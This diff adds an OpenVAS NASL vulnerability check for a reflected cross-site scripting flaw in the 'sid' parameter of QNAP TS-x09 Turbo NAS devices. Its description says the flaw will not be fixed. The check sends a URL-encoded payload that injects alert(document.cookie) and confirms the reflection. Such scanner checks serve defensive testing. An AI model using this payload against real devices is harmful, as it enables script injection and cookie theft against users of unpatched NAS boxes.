@@ -1,0 +1,125 @@
+###############################################################################
+# OpenVAS Vulnerability Test
+# $Id: gb_qnap_turbo_nas_reflected_xss_vuln.nasl 3883 2016-08-25 05:37:27Z antu123 $
+#
+# QNAP TS_x09 Turbo NAS Devices Reflected Cross-Site Scripting Vulnerability
+#
+# Authors:
+# Rinu KUriakose <krinu@secpod.com>
+#
+# Copyright:
+# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
+#
+# This program is free software; you can redistribute it and/or modify
+# it under the terms of the GNU General Public License version 2
+# (or any later version), as published by the Free Software Foundation.
+#
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with this program; if not, write to the Free Software
+# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
+###############################################################################
+
+if(description)
+{
+  script_oid("1.3.6.1.4.1.25623.1.0.805694");
+  script_version("$Revision: 3883 $");
+  script_tag(name:"cvss_base", value:"4.3");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
+  script_tag(name:"last_modification", value:"$Date: 2016-08-25 07:37:27 +0200 (Thu, 25 Aug 2016) $");
+  script_tag(name:"creation_date", value:"2015-07-28 11:38:53 +0530 (Tue, 28 Jul 2015)");
+  script_tag(name:"qod_type", value:"exploit");
+  script_name("QNAP TS_x09 Turbo NAS Devices Reflected Cross-Site Scripting Vulnerability");
+
+  script_tag(name: "summary" , value:"This host has QNAP TS-x09 Turbo NAS device
+  and is prone to reflected cross site scripting vulnerability.");
+
+  script_tag(name: "vuldetect" , value:"Send a crafted HTTP GET request and
+  check whether it is able read the cookie or not");
+
+  script_tag(name: "insight" , value:" The flaw is due to an input passed via
+  the 'sid' variable in 'cgi-bin/user_index.cgi' and 'cgi-bin/index.cgi' is not
+  properly sanitized.");
+
+  script_tag(name: "impact" , value:"Successful exploitation will allow remote
+  unauthenticated attacker to inject arbitrary JavaScript which is executed
+  server-side by escaping from the quotation marks.
+
+  Impact Level: Application");
+
+  script_tag(name: "affected" , value:"
+  QNAP devices,
+  TS-109 PRO and TS-109 II Version 3.3.0 Build 0924T
+  TS-209 and TS-209 PRO II Version 3.3.3 Build 1003T
+  TS-409 and TS-409U Version 3.3.2 Build 0918T.");
+
+  script_tag(name: "solution" , value:"No solution or patch was made available for
+  at least one year since disclosure of this vulnerability. Likely none will be
+  provided anymore. General solution options are to upgrade to a newer release,
+  disable respective features, remove the product or replace the product by another
+  one.");
+
+  script_xref(name : "URL" , value : "http://www.mogozobo.com/?p=2574");
+  script_xref(name : "URL" , value : "https://packetstormsecurity.com/files/132840");
+  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2015/Jul/115");
+
+  script_summary("Check if QNAP TS-x09 Turbo NAS device is vulnerable to reflected xss");
+  script_tag(name:"solution_type", value:"WillNotFix");
+  script_category(ACT_ATTACK);
+  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
+  script_family("Web application abuses");
+  script_dependencies("find_service.nasl");
+  script_require_ports("Services/www", 8080);
+  exit(0);
+}
+
+
+include("http_func.inc");
+include("http_keepalive.inc");
+
+## Variable Initialization
+nasPort = "";
+sndReq = "";
+rcvRes = "";
+
+## Get HTTP Port
+nasPort = get_http_port(default:8080);
+if(!nasPort){
+  nasPort = 8080;
+}
+
+## Check Port State
+if(!get_port_state(nasPort)){
+  exit(0);
+}
+
+## Detect NVT is not possible
+## Iterate over possible paths
+foreach dir (make_list_unique("/", "/cgi-bin", cgi_dirs()))
+{
+  if( dir == "/" ) dir = "";
+
+  ##Send Request and Receive Response
+  sndReq = http_get(item:string(dir,"/html/login.html"), port:nasPort);
+  rcvRes = http_keepalive_send_recv(port:nasPort, data:sndReq);
+
+  # Confirm the Alpication
+  if("Welcome to QNAP Turbo NAS" >< rcvRes)
+  {
+    # Vulnerable url
+    url = dir + "/user_index.cgi?sid=%22%3balert%28document.cookie%29%2f%2f";
+
+    ## Checking response to confirm the vulnerbility
+    if(http_vuln_check(port:nasPort, url:url, pattern:"alert\(document.cookie\)",
+                       extra_check:"QNAP Turbo NAS", check_header:TRUE))
+    {
+      report = report_vuln_url( port:nasPort, url:url );
+      security_message(port:nasPort, data:report);
+      exit(0);
+    }
+  }
+}
